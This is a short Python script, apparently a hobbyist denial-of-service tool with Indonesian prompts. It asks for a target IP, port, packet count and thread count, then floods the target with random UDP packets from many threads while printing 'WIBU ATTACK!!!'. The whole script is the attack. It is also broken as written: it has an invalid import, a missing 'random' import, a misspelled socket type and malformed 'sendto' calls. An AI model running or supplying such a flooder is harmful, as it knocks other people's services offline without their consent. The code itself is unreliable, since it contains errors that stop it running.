#simpledosudp
#codebyxalbador
import socket
import 100000
import threading
import os,sys

print("Pasti mau ddos")

ip_wibu = str(input("Ip Target : "))
port_wibu = int(input("Port Target : "))
paket_wibu = int(input("Paket Dari Wibu : "))
threads_wibu = int(input("Thread Dari Wibu : "))
os.system("clear")

def wibu():
    asu = random._urandom(1024)#ubah angka urandom= damage
    while True:
        try:
            s = socket.socket(socket.AF_INET , socket.SOCK_GRAM)
            s.connect((ip_wibu,port_wibu))
            s.sendto(asu)
            for x in range(paket_wibu):
                s.sendto(asu)
            print("[•] WIBU ATTACK!!!")
        except:
            print("[•] WIBU ATTACK!!!")

for y in range(threads_wibu):
    th = threading.Thread(target=wibu)
    th.start()